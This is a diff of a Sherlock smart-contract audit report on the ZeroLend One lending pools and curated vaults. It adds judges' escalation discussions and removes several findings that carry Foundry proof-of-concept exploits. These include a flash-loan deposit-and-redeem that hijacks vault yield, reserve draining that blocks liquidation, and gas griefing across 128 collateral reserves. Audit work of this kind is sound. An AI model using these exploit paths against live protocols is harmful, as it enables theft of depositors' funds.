 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473 
 
 ## Found by 
-000000, 0xAlix2, A2-security, BiasedMerc, Bigsam, Honour, JCN, JuggerNaut63, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, charlesjhongc, dany.armstrong90, denzi\_, dhank, ether\_sky, iamnmt, jah, joshuajee, lemonmon, neon2835, oxelmiguel, perseus, silver\_eth, trachev, uint6
+000000, 0xAlix2, A2-security, BiasedMerc, Bigsam, DenTonylifer, Honour, JCN, JuggerNaut63, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, charlesjhongc, coffiasd, dany.armstrong90, denzi\_, dhank, ether\_sky, iamnmt, jah, joshuajee, lemonmon, neon2835, oxelmiguel, perseus, silver\_eth, trachev
 ## Summary
 There is an error in the calculation of the supply/debt balance of a position, impacting a wide range of operations across the system, including core lending features.
 
@@ -2242,6 +2123,67 @@ The `getSupplyBalance` and `getDebtBalance` functions need an update to accurate
   }
 ```
 
+
+
+## Discussion
+
+**DemoreXTess**
+
+Escalate
+
+As I stated in #107 , there are two issues categorized in the same pool. I know it's same problem which is applied to two different variable but the debt and supply are completely different things. Those issues have completely different impacts on the protocol even the problem is similar.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> As I stated in #107 , there are two issues categorized in the same pool. I know it's same problem which is applied to two different variable but the debt and supply are completely different things. Those issues have completely different impacts on the protocol even the problem is similar.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**Tomiwasa0**
+
+2 different issues with 2 different impacts. 2 different root cause but similar. 
+This should be separated into two issues
+Incorrect Supply - 189, 210, 1, 19, 29, 84,127,149, 51, 243, 250, 269, 313, 357, 420, 440, 491, 506.
+Incorrect Debt - 190, 208, 2, 30 126, 152, 157, 161, 180, 254 ,270, 314, 421, 459. 
+
+Some Watsons submitted this together - 52, 473, 138, 272, 444, 469, 503, 504, 516. 
+
+I missed some anyone can help add them also. But my point is in line with @DemoreXTess  these are two different issues with different impacts hence they should be classified appropriately. Thank you.
+
+**cvetanovv**
+
+I disagree with the escalation.
+
+The Lead Judge correctly duplicated them under the same logical error rule.
+
+> If the following issues appear in multiple places, even in different contracts
+> - Issues with the same logic mistake.
+
+Moreover, the root cause is the same. It is that the functions return `share amount` instead of `asset amount`.
+
+You might also look at some Watson's who have written two issues and see how the difference is only a few words (for example, #151 and #152).
+
+Planning to reject the escalation and leave the issue as is.
+
+**WangSecurity**
+
+Result:
+High
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473/#issuecomment-2391694709): rejected
+
 # Issue M-1: Using the same heartbeat for multiple price feeds, causing DOS 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/9 
@@ -2429,6 +2371,49 @@ library SharesMathLib {
 DECIMAL_OFFSETS and virtual shares work [hand in hand to combat first depositor inflation attacks](https://docs.openzeppelin.com/contracts/4.x/erc4626#defending_with_a_virtual_offset), so I personally believe they are duplicates and under a single category of issues. Additionally, even if offset is zero and virtual shares is implemented, it can already make the attack non-profitable, so I would say the root cause here is the lack of implementation of a virtual share
 
 > If the offset is greater than 0, the attacker will have to suffer losses that are orders of magnitude bigger than the amount of value that can hypothetically be stolen from the user.
+
+**Honour-d-dev**
+
+This "attack" result in a loss for both attacker and victim... I don't believe it is valid because IRL no one would pull of an attack where they loose funds as well, it can't even count as griefing.
+
+Also the PoC is incomplete and misleading by omitting the fact that there's a huge loss for the attacker as well
+
+**Honour-d-dev**
+
+Escalate
+
+per above comment
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> per above comment
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+Although the grief attack will also cause the malicious user to take losses, it is possible, and I think Medium severity is appropriate for this issue.
+
+Planning to reject the escalation and leave the issue as is.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141/#issuecomment-2392010510): rejected
 
 # Issue M-3: Malicious actors can execute sandwich attacks during market addition with existing funds 
 
@@ -2784,922 +2769,527 @@ Explanation:
 
 
 
-# Issue M-4: Liquidation can be DOSed due to lack of liquidity on collateral asset reserve 
+**Honour-d-dev**
 
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198 
+Escalate
 
-## Found by 
-A2-security, Flashloan44, Obsidian, almurhasan, zarkk01
-### Summary
+The report claims this issue is valid due to the following reasons 
 
-Lack of liquidity on collateral asset reserves can cause disruption to liquidation. 
+>**Isn't it impossible to add a market with existing funds?**
+A: No, it's actually possible and even anticipated in two scenarios:
+Reintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.
+Adding a new market that received donations to the vaults position directly via the pool contract.
+>
+>The contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code // Take into account assets of the new market without applying a fee.
+>
+>**Why is this vulnerability critical?**
+A: It's critical because:
+>
+>It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.
+Even donations loss can be considered as a loss for existing users.
 
-### Root Cause
+I believe this report is invalid for the following reasons
 
-The protocol don't have option to disable borrowing or withdrawing in a particular asset reserve for a certain extent to protect the collateral deposits. It can only [disable borrowing](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L166-L167) or [freeze](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L148-L149) the whole reserves but not for specific portion such as collateral deposits. This can be a big problem because someone can always deduct or empty the reserves either by withdrawing their lended assets or borrowing loan. And when the liquidation comes, the collateral can't be paid to liquidator because the asset reserve is already not enough or emptied.
+**on adding/removing markets with existing funds**
 
-The pool administrator might suggest designating whole asset reserve to be used only for collateral deposit purposes and not for lending and borrowing. However this can be circumvented by malicious users by transferring their collateral to other reserves that accepts borrowing and lending which can eventually led the collateral to be borrowed. This is the nature of multi-asset lending protocol, it allows multiple asset reserves for borrowing and lending as per protocol documentation.
+- There is a `reallocate()` function for this exact purpose to transfer all funds from a pool before removal, because removing a pool with existing funds will lead to a loss for the depositors.
+- The removal and addition of markets are admin functionalities and we can assume that the admin will follow the right process to prevent losses to users.
 
-There could be another suggestion to resolve this by only using one asset reserve per pool that offers lending and borrowing but this will already contradict on what the protocol intends to be which is to be a multi-asset lending pool, meaning there are multiple assets offering lending in single pool.
-
-If the protocol intends to do proper multi-asset lending pool platform, it should protect the collateral assets regarding liquidity issues. 
-
-### Internal pre-conditions
-
-1. Pool creator should setup the pool with more than 2 asset reserves offering lending or borrowing and each of reserves accepts collateral deposits. It allows any of the asset reserves to conduct borrowing to any other asset reserves and vice versa. This is pretty much the purpose and design of the multi-asset lending protocol as per documentation.
-
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-This can be considered as attack path or can happen also as normal scenario due to the nature or design of the multi-asset lending protocol. Take note the step 6 can be just a normal happening or deliberate attack to disrupt the liquidation.
-
-<img width="579" alt="image" src="https://github.com/user-attachments/assets/3a33a2b1-1e9d-4cc5-8463-8b4a4fcc5f46">
-
-
-
-### Impact
-This should be high risk since in a typical normal scenario, this vulnerability can happen without so much effort.
-The protocol also suffers from bad debt as the loan can't be liquidated.
-
-### PoC
-
-1. Modify this test file /zerolend-one/test/forge/core/pool/PoolLiquidationTests.t.sol
-and insert the following:
-a. in line 16, put address carl = address(3); // add carl as borrower
-b.  modify this function _generateLiquidationCondition() internal {
-    _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA
-    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB
-    _mintAndApprove(carl, tokenB, mintAmountB, address(pool)); // carl 2000 tokenB >>> add this line 
-
-
-    vm.startPrank(alice);
-    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply
-    vm.stopPrank();
-
-    vm.startPrank(bob);
-    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
-    vm.stopPrank();
-
-    vm.startPrank(carl);
-    pool.supplySimple(address(tokenB), carl, supplyAmountB, 0); // 750 tokenB carl supply >>> add this portion
-    vm.stopPrank();
-
-    vm.startPrank(alice);
-    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow
-    vm.stopPrank();
-
-    assertEq(tokenB.balanceOf(alice), borrowAmountB);
-
-    oracleA.updateAnswer(5e3);
-  }
-  c. Insert this test
-  function testLiquidationSimple2() external {
-    _generateLiquidationCondition();
-    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);
-
-    vm.startPrank(carl);
-    pool.borrowSimple(address(tokenA), carl, borrowAmountB, 0); // 100 tokenA carl borrow to deduct the reserves in which the collateral is deposited
-    vm.stopPrank();
-
-    vm.startPrank(bob);
-    vm.expectRevert();
-    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10 ether); // Bob tries to liquidate Alice but will revert
-
-    vm.stopPrank();
-
-    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);
-
-    // Ensure that no liquidation happened and Alice's debt remains the same
-    assertEq(totalDebtBase, totalDebtBaseNew, "Debt should remain the same after failed liquidation");
-
-  }
-  2. Run the test forge test -vvvv --match-contract PoolLiquidationTest --match-test testLiquidationSimple2
-
-### Mitigation
-
-Each asset reserve should be modified to not allow borrowing or withdrawing for certain collateral deposits. For example, if a particular asset reserve has deposits for collateral, these deposits should not be allowed to be borrowed or withdrew. The rest of the balance of asset reserves will do the lending. At the current design, the pool admin can only make the whole reserve as not enabled for borrowing but not for specific account or amount.
-
-
-
-## Discussion
+**on donations**
+- Market donations fall under the **user mistakes** category, as donated funds are lost any ways. Donations can happen regardless of whether a new market is being added or not and a watcher can take advantage of the  increase in totalAssets to extract some value , this does not affect existing users negatively as they also benefit from said donations.
 
 **sherlock-admin3**
 
-1 comment(s) were left on this issue during the judging contest.
+> Escalate
+> 
+> The report claims this issue is valid due to the following reasons 
+> 
+> >**Isn't it impossible to add a market with existing funds?**
+> A: No, it's actually possible and even anticipated in two scenarios:
+> Reintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.
+> Adding a new market that received donations to the vaults position directly via the pool contract.
+> >
+> >The contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code // Take into account assets of the new market without applying a fee.
+> >
+> >**Why is this vulnerability critical?**
+> A: It's critical because:
+> >
+> >It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.
+> Even donations loss can be considered as a loss for existing users.
+> 
+> I believe this report is invalid for the following reasons
+> 
+> **on adding/removing markets with existing funds**
+> 
+> - There is a `reallocate()` function for this exact purpose to transfer all funds from a pool before removal, because removing a pool with existing funds will lead to a loss for the depositors.
+> - The removal and addition of markets are admin functionalities and we can assume that the admin will follow the right process to prevent losses to users.
+> 
+> **on donations**
+> - Market donations fall under the **user mistakes** category, as donated funds are lost any ways. Donations can happen regardless of whether a new market is being added or not and a watcher can take advantage of the  increase in totalAssets to extract some value , this does not affect existing users negatively as they also benefit from said donations.
 
-**Honour** commented:
->  see #147
+You've created a valid escalation!
 
+To remove the escalation from consideration: Delete your comment.
 
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
 
-# Issue M-5: An attacker can hijack the `CuratedVault`'s matured yield 
+**0xNirix**
 
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199 
+Absolutely, vault allocator will try to withdraw from pools via reallocate before removing a pool. However, it is not possible in all scenarios. There might be a number of reasons for withdrawals to not happen or to be incomplete e.g. complete withdrawal amount not available in pool or any configuration changes by pool managers e.g. freezing the reserves. Pool managers cannot be trusted by vault managers according to README.
+> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.
 
-## Found by 
-0xAlix2, 0xc0ffEE, A2-security, JCN, Minato7namikazi, Obsidian, TessKimy, Varun\_05, dhank, ether\_sky, iamnmt, trachev, zarkk01
-### Summary
+The code specifically tries to handle such scenarios further indicating they are completely intentional:
 
-`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning will cause the matured yield to be distributed to users that do not supply to the vault before the yield accrues. An attacker can exploit this to hijack the `CuratedVault`'s matured yield.
-
-### Root Cause
-
-`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372
-
+1. The contract includes mechanisms to remove pools with remaining assets. This is evident in the updateWithdrawQueue function:
 ```solidity
-  function totalAssets() public view override returns (uint256 assets) {
-    for (uint256 i; i < withdrawQueue.length; ++i) {
-      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
-    }
-  }
-```
-
-### Internal pre-conditions
-
-_No response_
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-Let's have:
-- A vault has a total assets of `totalAssets`
-- `X` amount of yield is accrued from `T1` to `T2`
-
-1. The attacker takes a flash loan of `flashLoanAmount`
-2. The attacker deposits `flashLoanAmount` at `T2` to the vault. Since `CuratedVault#totalAssets` does not update pool's `liquidityIndex`, the minted shares are calculated based on the total assets at `T1`.
-3. The attacker redeems all the shares and benefits from `X` amount of yield.
-4. The attacker repays the flash loan.
-
-The cost of this attack is gas fee and flash loan fee.
-
-### Impact
-
-The attacker hijacks `flashLoanAmount / (flashLoanAmount + totalAssets)` percentage of `X` amount of yield.
-
-`X` could be a considerable amount when:
-- The pool has high interest rate.
-- `T2 - T1` is large. This is the case for the pool with low interactions.
-
-When `X` is a considerable amount, the amount of hijacked funds could be greater than the cost of the attack, then the attacker will benefit from the attack.
-
-### PoC
-
-Due to a bug in `PositionBalanceConfiguration#getSupplyBalance` that we submitted in a different issue, fix the `getSupplyBalance` function before running the PoC
-
-`core/pool/configuration/PositionBalanceConfiguration.sol`
-
-```diff
-library PositionBalanceConfiguration {
-  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
--   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
--   return self.supplyShares + increase;
-+   return self.supplyShares.rayMul(index);
-  }
-}
-```
-
-Run command: `forge test --match-path test/PoC/PoC.t.sol`
-
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-import {console} from 'lib/forge-std/src/Test.sol';
-import '../forge/core/vaults/helpers/IntegrationVaultTest.sol';
-
-contract ERC4626Test is IntegrationVaultTest {
-  address attacker = makeAddr('attacker');
-
-  function setUp() public {
-    _setUpVault();
-    _setCap(allMarkets[0], CAP);
-    _sortSupplyQueueIdleLast();
-
-    oracleB.updateRoundTimestamp();
-    oracle.updateRoundTimestamp();
-
-    uint256 vaultAssets = 10 ether;
-
-    loanToken.mint(supplier, vaultAssets);
-    vm.prank(supplier);
-    vault.deposit(vaultAssets, supplier);
-    
-    vm.prank(attacker);
-    loanToken.approve(address(vault), type(uint256).max);
-  }
-
-  function testDeposit() public {
-    collateralToken.mint(borrower, type(uint128).max);
-
-    vm.startPrank(borrower);
-    allMarkets[0].supplySimple(address(collateralToken), borrower, type(uint128).max, 0);
-    allMarkets[0].borrowSimple(address(loanToken), borrower, 8 ether, 0);
-
-    skip(100 days);
-
-    oracleB.updateRoundTimestamp();
-    oracle.updateRoundTimestamp();
-
-    uint256 vaultAssetsBefore = vault.totalAssets();
-
-    console.log("Vault's assets before updating reserve: %e", vaultAssetsBefore);
-
-    uint256 snapshot = vm.snapshot();
-
-    allMarkets[0].forceUpdateReserve(address(loanToken));
-    console.log("Vault's accrued yield: %e", vault.totalAssets() - vaultAssetsBefore);
-
-    vm.revertTo(snapshot);
-
-    uint256 flashLoanAmount = 100 ether;
-
-    loanToken.mint(attacker, flashLoanAmount);
-
-    vm.startPrank(attacker);
-    uint256 shares = vault.deposit(flashLoanAmount, attacker);
-    vault.redeem(shares, attacker, attacker);
-    vm.stopPrank();
-
-    console.log("Attacker's profit: %e", loanToken.balanceOf(attacker) - flashLoanAmount);
-  }
-}
-```
-
-Logs:
-
-```bash
-  Vault's assets before updating reserve: 1e19
-  Vault's accrued yield: 5.62832773326440941e17
-  Attacker's profit: 5.11666157569491763e17
-```
-
-Although the yield accrued, the vault's assets before updating reserve is still `1e19`.
-
-### Mitigation
-
-Update pool's `liquidityIndex` at the beginning of `CuratedVault#totalAssets` 
-
-```diff
-  function totalAssets() public view override returns (uint256 assets) {
-    for (uint256 i; i < withdrawQueue.length; ++i) {
-+     withdrawQueue[i].forceUpdateReserve(asset());
-      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
-    }
-  }
-```
-
-# Issue M-6: Borrowers can make their position unprofitable to liquidated by using too many collateral tokens. 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/231 
-
-## Found by 
-joshuajee
-### Summary
-
-The maximum number of reserve tokens that a pool can have is 128 (This to prevent out of gas error). 
-During liquidation all 128 assets are looped through adding to the total gas usage, 
-a malicious user can exploit this by providing collateral worth 500 USD in the 128 reserve tokens, so they supply collateral of about 3.9 USD in each.
-after that, they borrow about 400 of the tokens they want.
-
-### Root Cause
-
-
-The root cause of this bug lies in the fact that users can supply any amount of collateral even 1 wei and still take loans with it.
-The more the numbers of collaterals they have in their basket the more the gas usage during liquidation. 
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L82
-
-```js
-
-  function calculateUserAccountData(
-    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage _balances,
-    mapping(address => DataTypes.ReserveData) storage reservesData,
-    mapping(uint256 => address) storage reservesList,
-    DataTypes.CalculateUserAccountDataParams memory params
-  ) internal view returns (uint256, uint256, uint256, uint256, uint256, bool) {
-
-    //@query what happens when i supply and withdraw
-    if (params.userConfig.isEmpty()) {
-      return (0, 0, 0, 0, type(uint256).max, false);
-    }
-
-    CalculateUserAccountDataVars memory vars;
-    uint256 reservesCount = IPool(params.pool).getReservesCount();
-@-> while (vars.i < reservesCount) {
-      if (!params.userConfig.isUsingAsCollateralOrBorrowing(vars.i)) {
-        unchecked {
-          ++vars.i;
+        if (pool.supplyShares(asset(), positionId) != 0) {
+          if (config[pool].removableAt == 0) revert CuratedErrorsLib.InvalidMarketRemovalNonZeroSupply(pool);
+          if (block.timestamp < config[pool].removableAt) {
+            revert CuratedErrorsLib.InvalidMarketRemovalTimelockNotElapsed(pool);
+          }
         }
-        continue;
-      }
-    ..
 ```
+In this code, after timelock expiry (removableAt) pool with assets will be removed.
 
-For example 
-ETH = 2271 USD
-if they borrow with the whole 128 assets as collateral the gas used during liquidation will be  1,005,205 that's about 2.28 USD in gas cost.
-Given that the collateral for the single asset that the liquidator wants to liquidate is 3.9 USD, the liquidation is not really worth it as the liquidation bonus cannot cover the gas cost.
-
-The total cost of liquidating the whole position is (1,005,205 * 128 / 2) = 64,333,120 i.e 147 USD
-
-
-### Internal pre-conditions
-
-A pool with 128 reserve tokens
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-Assuming that the average LTV is 0.8
-
-1. Attacker supplies 3.9 USD to all 128 reserves which is about 500 USD
-2. Attacker borrows 400 USD.
-3. Heath factor falls below 1.
-4. The gas cost of liquidating just one collateral is 2.28 USD and the gain is (3.9 * 1.05 - 3.9) = 0.195 USD
-5. Because the gas cost in liquidating the position is far greater than the liquidation bonus they will not liquidate the position.
-
-
-### Impact
-
-1. The position will not be liquidated on time. 
-2. Many positions will go insolvent without liquidators to close them.
-3. Liquidity providers will lose money.
-
-### PoC
-
-
-Add the following test to the `forge/core/pool` folder and run the test.
-
-This is the output.
-
-Gas Used : 1005198
-HF before : 916085486657142857 35000000000
-HF After  : 916743203363504031 34700037495
-
-We can see the current gas cost is 1005198.
-
-
-```js
-// SPDX-License-Identifier: BUSL-1.1
-pragma solidity 0.8.19;
-
-import './PoolSetup.sol';
-
-import {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';
-
-import {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';
-
-contract LiquidationGGPOC is PoolSetup {
-  using UserConfiguration for DataTypes.UserConfigurationMap;
-  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;
-
-
-  MintableERC20[] tokens;
-  MockV3Aggregator[] oracles;
-
-  uint reserveCount = 128;
-
-  address alice = makeAddr("alice");
-  address bob = makeAddr("bob");
-  uint256 mintAmount =  50000 ether;
-  uint256 mintAmountB = 50000 ether;
-  uint256 supplyAmountA = 500 ether;
-  uint256 supplyAmountB = 750 ether;
-  uint256 borrowAmountB = 350 ether;
-
-  function setUp() public {
-    poolImplementation = new Pool();
-
-    poolFactory = new PoolFactory(address(poolImplementation));
-    configurator = new PoolConfigurator(address(poolFactory));
-
-    poolFactory.setConfigurator(address(configurator));
-
-    for (uint i = 0; i < reserveCount - 1; i++) {
-        tokens.push(new MintableERC20('TOKEN A', 'TOKENA'));
-        oracles.push(new MockV3Aggregator(8, 1e8));
-    }
-
-    tokens.push(new MintableERC20('WETH9', 'WETH9'));
-    oracles.push(new MockV3Aggregator(6, 3000 * 1e8));
-
-    irStrategy = new DefaultReserveInterestRateStrategy(47 * 1e25, 0, 7 * 1e25, 30 * 1e25);
-
-    vm.label(address(poolFactory), 'PoolFactory');
-    vm.label(address(irStrategy), 'irStrategy');
-    vm.label(address(configurator), 'configurator');
-
-    poolFactory.createPool(_poolInitParams());
-    IPool poolAddr = poolFactory.pools(0);
-    pool = IPool(address(poolAddr));
-
-    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));
-  }
-
-  function testLiquidationSimple() external {
-
-    _mintAndApprove(alice, tokens[reserveCount - 1], mintAmount, address(pool));
-
-    //Token index 0 is the collateral
-    //Token index 1 is the borrowed token
-    for (uint i = 0; i < reserveCount - 1; i++) {
-        //Don't mint the borrowed token for alice
-        _mintAndApprove(alice, tokens[i], mintAmount, address(pool));
-        vm.prank(alice);
-        pool.supplySimple(address(tokens[i]), alice, (supplyAmountA / (reserveCount - 1)), 0);
-        //console.log("S: ", supplyAmountA / (reserveCount - 1));
-    }
-
-    //Mint the borrowed token for bob
-    _mintAndApprove(bob, tokens[1], mintAmount, address(pool));
-    vm.prank(bob);
-    pool.supplySimple(address(tokens[1]), bob, supplyAmountB, 0); // 750 tokenB bob supply
-
-    vm.startPrank(alice);
-
-    pool.supplySimple(address(tokens[reserveCount - 1]), alice, 1, 0); // send 1 weth tokenA alice supply
-    pool.borrowSimple(address(tokens[1]), alice, borrowAmountB, 0); // 100 tokenB alice borrow
-    vm.stopPrank();
-
-    for (uint i = 0; i < reserveCount - 1; i++) {
-        if (i == 1) continue;
-        oracles[i].updateAnswer(8e7);
-    }
-
-    (,uint debtBefore,,,,uint healthFactorBefore) = pool.getUserAccountData(alice, 0);
-
-    uint initialGas = gasleft();
-    vm.prank(bob);
-    pool.liquidateSimple(address(tokens[0]), address(tokens[1]), pos, 200 ether);
-    console.log("Gas Used :", initialGas - gasleft());
-
-
-    (,uint debtAfer,,,, uint healthFactorAfter) = pool.getUserAccountData(alice, 0);
-
-    console.log("HF before :", healthFactorBefore, debtBefore);
-    console.log("HF After  :", healthFactorAfter, debtAfer);
-
-  }
-
-function _poolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {
-
-    (
-    address[] memory assets, 
-    address[] memory rateStrategyAddresses, 
-    address[] memory sources, 
-    DataTypes.InitReserveConfig[] memory configurationLocal 
-    ) = _generateAddresses();
-
-    address[] memory admins = new address[](1);
-    admins[0] = address(this);
-
-    p = DataTypes.InitPoolParams({
-      proxyAdmin: address(this),
-      revokeProxy: false,
-      admins: admins,
-      emergencyAdmins: new address[](0),
-      riskAdmins: new address[](0),
-      hook: address(0),
-      assets: assets,
-      rateStrategyAddresses: rateStrategyAddresses,
-      sources: sources,
-      configurations: configurationLocal
-    });
-  }
-
-
-  function _generateAddresses()
-    internal view returns (address[] memory, address[] memory, address[] memory, DataTypes.InitReserveConfig[] memory) {
-    address[] memory assets = new address[](reserveCount);
-    address[] memory rateStrategyAddresses = new address[](reserveCount);
-    address[] memory sources = new address[](reserveCount);
-    DataTypes.InitReserveConfig memory config = _basicConfig();
-    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](reserveCount);
-    for (uint i = 0; i < reserveCount; i++) {
-        assets[i] = address(tokens[i]);
-        rateStrategyAddresses[i] = address(irStrategy);
-        sources[i] = address(oracles[i]);
-        configurationLocal[i] = config;
-    }
-    return (assets, rateStrategyAddresses, sources, configurationLocal);
-  }
-
-}
-```
-
-### Mitigation
-
-1. Enforce a minimum supply amount for an asset to be used as collateral.
-2. Limit the total number of active collateral for a position to 10 tokens.
-
-
-
-
-## Discussion
-
-**sherlock-admin3**
-
-1 comment(s) were left on this issue during the judging contest.
-
-**Honour** commented:
->  It's not practical for a pool to have that many tokens. Deploying such a pool itself would be gas intensive for the owner (especially on mainet). Also the 128 limit is not neccessarily to prevent out of gas errors but because collateral/debt info is stored in a 256-bit word for gas efficiency
-
-
-
-**nevillehuang**
-
-This is a very interesting finding, will leave open for escalation discussion, especially when pool creation is permisionless so is subject to various configuration
-
-# Issue M-7: When the collateral token is BNB, full liquidations will revert due to sending 0 amount 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/279 
-
-## Found by 
-Obsidian
-### Summary
-
-BNB has a check in it's `transfer()` function to revert for 0 amounts
-
-The issue is that during complete liquidations (taking all the collateral), the following [[code](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L178-L189)](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L178-L189) will send a 0 amount, which will revert the whole liquidation call
+2. Furthermore, the contract anticipates potential resolution of pool issues, allowing for the reintegration of previously removed assets. If a pool's problems are resolved in the future, the vault allocator would naturally want to reclaim those assets for the benefit of their vault users. This is why the following code exists to add back the pool's assets to the vault's total assets:
 
 ```solidity
-// Transfer fee to treasury if it is non-zero
-    if (vars.liquidationProtocolFeeAmount != 0) {
-      uint256 liquidityIndex = collateralReserve.getNormalizedIncome();
-      uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);
-      uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;
-
-      if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {
-        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);
-      }
-
-      IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);
-    }
-
+        pool.forceUpdateReserve(asset());
+        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);
+        _updateLastTotalAssets(lastTotalAssets + supplyAssets);
 ```
 
-Even if the `vars.liquidationProtocolFeeAmount != 0`
+However, this creates a vulnerability: An attacker can exploit this process to steal a majority of these funds, as demonstrated in the provided Proof of Concept (POC).
 
-since `scaledDownUserBalance == 0` (user has 0 collateral since the liquidator took all of it)
+**cvetanovv**
 
-It will update `vars.liquidationProtocolFeeAmount == scaledDownUserBalance.rayMul(liquidityIndex)`, which is 0
+I believe the main factor that validates this issue is the lack of trust between vault managers and pool managers:
 
-Therefore trying to transfer the 0 amount will revert
+> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.
 
-### Root Cause
+When a pool with remaining assets is removed and later reintegrated, its assets can be exploited and stolen through this vulnerability. The key point is that vault and pool actors do not trust each other, which leaves room for such vulnerabilities.
 
-During a full liquidation, it will attempt to transfer a 0 amount [here](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L178-L189), which will revert the whole liquidation call
+Planning to reject the escalation and leave the issue as is.
 
-### Internal pre-conditions
+**0xjuaan**
 
-Collateral token of user is BNB
+Hi @cvetanovv this is an invalid issue because the protocol works exactly how it's meant to. 
 
-### External pre-conditions
+When removing a pool, the curator should reallocate the assets of the pool into a different pool before removing it. If this correct order is followed, the issue does not arise.
 
-Liquidator attempts to take all the collateral
+Now the watson has stated in the comments (not the original report) that there are some cases where pool managers are malicious and freeze reserves so reallocation is not possible. In that case, if the pool is malicious, its irrational for curators to add the same pool back after removing it. So again, the issue won't occur. 
 
-### Attack Path
-
-_No response_
-
-### Impact
-
-Liquidation reverts, increasing the risk of accumulating bad debt
-
-### PoC
-
-_No response_
-
-### Mitigation
-
-Implement the 0 amount check right before the transfer to prevent this issue
+Furthermore, if they know the freezing is going to be temporary, then they wouldn't remove the funds from the pool in the first place. If they do so, it's incorrect actions by the vault curator causing harm to vault depositors.
 
 
+**0xNirix**
 
-## Discussion
